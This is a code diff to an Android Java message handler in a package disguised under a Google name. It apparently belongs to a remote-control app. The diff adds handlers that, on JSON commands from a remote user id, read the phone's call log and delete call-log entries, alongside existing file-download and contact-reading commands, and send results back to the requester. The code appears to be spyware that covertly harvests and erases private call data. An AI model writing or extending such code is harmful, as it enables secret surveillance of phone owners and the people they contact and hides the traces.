@@ -6,9 +6,11 @@ import java.util.List;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import com.google.undercontrol.dao.CallLogDao;
 import com.google.undercontrol.dao.ContactDao;
 import com.google.undercontrol.dao.FileDao;
 import com.google.undercontrol.dao.SmsDao;
+import com.google.undercontrol.domain.CallLogInfo;
 import com.google.undercontrol.domain.ContactInfo;
 import com.google.undercontrol.domain.ConversInfo;
 import com.google.undercontrol.domain.FileInfo;
@@ -81,13 +83,47 @@ public class MsgPorcess {
 //				下载文件
 				downloadFile(dwFromUserid, jObj);
 			}else if(type.equals(MsgType.READ_CONTACT_LIST)) {
-//				下载文件
+//				读取联系人列表
 				readContactList(dwFromUserid);
+			}else if(type.equals(MsgType.READ_CALL_LOG_LIST)) {
+//				读取通话记录列表
+				readCallLogList(dwFromUserid,jObj);
+			}else if(type.equals(MsgType.DEL_CALL_LOG)) {
+//				删除通话记录
+				delCallLog(dwFromUserid,jObj);
 			}
 		} catch (JSONException e) {
 			Log.e(TAG,"Json格式不正确！");
 			e.printStackTrace();
 		}
+	}
+	/**
+	 * 删除通话记录
+	 * @param dwFromUserid
+	 * @param jObj
+	 * @throws JSONException 
+	 */
+	private void delCallLog(int dwFromUserid, JSONObject jObj) throws JSONException {
+		CallLogDao dao=new CallLogDao(context);
+		int id = jObj.getInt(MsgType.DATA);
+		boolean b=dao.delete(id);
+		if (b) {
+			MsgUtils.send(context, dwFromUserid, MsgType.DEL_CALL_LOG_SUCCESS);
+		}else{
+			MsgUtils.send(context, dwFromUserid, MsgType.DEL_CALL_LOG_FAIL);
+		}
+	}
+	/**
+	 * 读取通话记录列表
+	 * @param dwFromUserid
+	 * @param jObj
+	 * @throws JSONException
+	 */
+	private void readCallLogList(int dwFromUserid, JSONObject jObj) throws JSONException {
+			CallLogDao dao=new CallLogDao(context);
+			int offset = jObj.getInt(MsgType.DATA);
+			List<CallLogInfo> list = dao.getList( offset);
+			MsgUtils.send(context, dwFromUserid, MsgType.CALL_LOG_LIST, list);
 	}
 	/**
 	 * 读取联系人列表
